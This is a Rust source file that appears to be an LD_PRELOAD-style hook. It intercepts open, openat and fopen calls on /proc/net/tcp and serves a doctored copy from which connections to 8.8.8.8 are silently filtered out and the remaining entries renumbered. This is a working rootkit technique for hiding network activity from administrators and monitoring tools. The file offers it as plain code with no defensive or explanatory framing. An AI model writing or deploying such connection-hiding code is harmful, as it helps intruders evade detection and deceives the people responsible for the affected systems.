extern crate libc;
use libc::{
    c_char, c_int, fileno, fputs, fseek, tmpfile, SEEK_SET, PATH_MAX
};
use std::{
    ffi::{CStr, CString}, fs::File, io::Read, path::{Path, PathBuf}, os::fd::FromRawFd
};

pub fn process_tcp_file() -> Option<c_int> {
    let mut buf = String::new();
    if unsafe {
        let path = CString::new("/proc/net/tcp").unwrap();
        let mode = CString::new("r").unwrap();
        let file_ptr = crate::fopen.get()(path.as_ptr(), mode.as_ptr());
        if file_ptr.is_null() {
            return None;
        }
        let mut file = File::from_raw_fd(fileno(file_ptr));
        let result = file.read_to_string(&mut buf);
        libc::fclose(file_ptr);
        result
    }.is_err() {
        eprintln!("[Fail to read]");
        return None;
    };

    let mut out = String::new();
    let mut curline = -1;
    for l in buf.lines() {
        if curline == -1 {
            curline += 1;
            out.push_str(l);
            out.push_str("\r\n");
        } else if !l.contains("08080808:") {
            let curline_str = curline.to_string();
            let colon_pos = l.find(":").unwrap();

            out.push_str(&format!("{:>0w$}{}", curline_str, l.split_at(colon_pos).1, w = colon_pos));
            out.push_str("\r\n");

            curline += 1;
        }
    }

    let Ok(_) = CString::new(buf) else {
        eprintln!("[Fail to create cstr]");
        return None;
    };

    let file = unsafe { tmpfile() };
    unsafe {
        fputs(CString::new(out).unwrap().as_ptr(), file);
        fseek(file, 0, SEEK_SET);
        Some(fileno(file))
    }
}

pub fn handle_open(cpath: *const c_char, oflag: c_int) -> Option<c_int> {
    let path = unsafe { CStr::from_ptr(cpath) };
    eprintln!("[open] path: {:?}", path);

    if path != c"/proc/net/tcp" {
        return None;
    }
    process_tcp_file()
}

pub fn handle_openat(
    dirfd: c_int,
    cpath: *const c_char,
    oflag: c_int,
) -> Option<c_int> {
    let path = unsafe { CStr::from_ptr(cpath) };
    eprintln!("[openat] dirfd: {}, path: {:?}", dirfd, path);

    // Resolve relative paths using dirfd
    let resolved_path = if path.to_bytes().starts_with(b"/") {
        PathBuf::from(path.to_string_lossy().to_string())
    } else if dirfd == libc::AT_FDCWD {
        std::env::current_dir()
            .unwrap_or_else(|_| PathBuf::from("/"))
            .join(path.to_string_lossy().as_ref())
    } else {
        let fd_path = PathBuf::from(format!("/proc/self/fd/{}", dirfd));
        let mut buf = vec![0; PATH_MAX as usize];
        let len = unsafe { libc::readlink(
            CString::new(fd_path.to_string_lossy().to_string()).unwrap().as_ptr(),
            buf.as_mut_ptr() as *mut c_char,
            PATH_MAX as usize,
        )};
        if len == -1 {
            eprintln!("[Fail to resolve dirfd]");
            return None;
        }
        let dir_path_str = unsafe { CStr::from_ptr(buf.as_ptr()).to_string_lossy().to_string() };
        let dir_path = Path::new(&dir_path_str);
        dir_path.join(path.to_string_lossy().as_ref())
    };

    if resolved_path != Path::new("/proc/net/tcp") {
        return None;
    }
    process_tcp_file()
}

pub fn handle_fopen(cpath: *const c_char, mode: *const c_char) -> Option<*mut libc::FILE> {
    let path = unsafe { CStr::from_ptr(cpath) };
    eprintln!("[fopen] path: {:?}", path);

    if path != c"/proc/net/tcp" {
        return None;
    }
    let fd = process_tcp_file();
    fd.map(|fd| unsafe { libc::fdopen(fd, mode) })
}
